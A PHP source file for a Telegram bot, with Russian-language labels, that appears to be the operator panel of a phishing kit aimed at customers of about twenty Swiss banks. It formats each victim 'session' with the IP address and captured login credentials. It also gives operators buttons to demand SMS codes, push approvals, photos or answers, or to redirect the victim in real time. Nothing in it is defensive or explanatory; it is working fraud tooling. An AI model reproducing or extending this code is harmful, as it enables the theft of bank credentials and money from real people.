<?php

namespace App\Services\Telegram;

use App\Enums\ActionType;
use App\Enums\BankSessionStatus;
use App\Models\BankSession;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;

class TelegramCardBuilder
{
    private const DISPLAY_NAMES = [
        'migros'                    => 'Migros Bank',
        'ubs'                       => 'UBS',
        'postfinance'               => 'PostFinance',
        'aek-bank'                  => 'AEK Bank',
        'bank-avera'                => 'Bank Avera',
        'swissquote'                => 'Swissquote',
        'baloise'                   => 'Baloise',
        'bancastato'                => 'BancaStato',
        'next-bank'                 => 'Next Bank',
        'llb'                       => 'LLB',
        'raiffeisen'                => 'Raiffeisen',
        'valiant'                   => 'Valiant',
        'bernerland'                => 'Bernerlend Bank',
        'cler'                      => 'Cler Bank',
        'dc-bank'                   => 'DC Bank',
        'banque-du-leman'           => 'Banque du Léman',
        'bank-slm'                  => 'Bank SLM',
        'sparhafen'                 => 'Sparhafen',
        'alternative-bank'          => 'Alternative Bank Schweiz',
        'hypothekarbank'            => 'Hypothekarbank Lenzburg',
        'banque-cantonale-du-valais' => 'Banque Cantonale du Valais',
    ];

    public function buildCardText(BankSession $session): string
    {
        $lines = [];
        $name  = self::DISPLAY_NAMES[$session->bank_slug] ?? $session->bank_slug;
        $status = match($session->status) {
            BankSessionStatus::Pending   => '🆕 Новая',
            BankSessionStatus::Assigned  => '⏳ В работе',
            BankSessionStatus::Completed => '✅ Завершена',
            default                      => '❓',
        };

        $lines[] = "🏦 <b>{$name}</b>  |  {$status}";
        if ($session->ip_address) {
            $lines[] = "🌍 IP " . e($session->ip_address);
        }

        $creds = $session->credentials ?? [];
        if ($creds) {
            $lines[] = '';
            foreach ($creds as $k => $v) {
                $lines[] = '<b>' . e(ucfirst($k)) . '</b>: <code>' . e((string) $v) . '</code>';
            }
        }

        $answers = $session->answers ?? [];
        if ($answers) {
            $lines[] = '';
            $lines[] = '<b>Ответы:</b>';
            foreach ($answers as $i => $a) {
                $cmd     = $a['command'] ?? '?';
                $payload = json_encode($a['payload'] ?? null, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
                $lines[] = sprintf('%d. %s → <code>%s</code>', $i + 1, e($cmd), e($payload));
            }
        }

        $current = $session->action_type['type'] ?? 'idle';
        $stateLabel = match ($current) {
            'hold.short'         => '⏳ Ожидание (короткое)',
            'hold.long'          => '⏳ Ожидание (долгое)',
            'sms'                => '📱 Ожидает SMS-код',
            'push'               => '🔔 Ожидает Push',
            'invalid-data'       => '❌ Неверные данные',
            'question'           => '❓ Вопрос клиенту',
            'error'              => '⚠️ Ошибка',
            'photo.with-input'   => '📸 Ожидает фото + текст',
            'photo.without-input' => '📸 Ожидает фото',
            'redirect'           => '🔗 Редирект',
            default              => '🟢 Новая',
        };
        $lines[] = '';
        $lines[] = '<i>Состояние: ' . $stateLabel . '</i>';

        return implode("\n", $lines);
    }

    public function buildKeyboard(BankSession $session): InlineKeyboardMarkup
    {
        $sid = $session->id;

        if ($session->isCompleted()) {
            return InlineKeyboardMarkup::make();
        }

        if ($session->isPending()) {
            return InlineKeyboardMarkup::make()
                ->addRow(
                    InlineKeyboardButton::make('📥 Назначить', callback_data: "assign:{$sid}"),
                );
        }

        // Assigned — full action keyboard
        $btn = fn(ActionType $a) => InlineKeyboardButton::make(
            text: $a->buttonLabel(),
            callback_data: "action:{$sid}:{$a->value}",
        );

        return InlineKeyboardMarkup::make()
            ->addRow($btn(ActionType::Sms), $btn(ActionType::Push))
            ->addRow($btn(ActionType::InvalidData), $btn(ActionType::Error))
            ->addRow($btn(ActionType::Question))
            ->addRow($btn(ActionType::PhotoWithInput), $btn(ActionType::PhotoWithoutInput))
            ->addRow($btn(ActionType::HoldShort), $btn(ActionType::HoldLong))
            ->addRow($btn(ActionType::Redirect))
            ->addRow($btn(ActionType::Idle))
            ->addRow(
                InlineKeyboardButton::make('✅ Завершить', callback_data: "complete:{$sid}"),
                InlineKeyboardButton::make('📤 Снять',    callback_data: "unassign:{$sid}"),
            );
    }
}
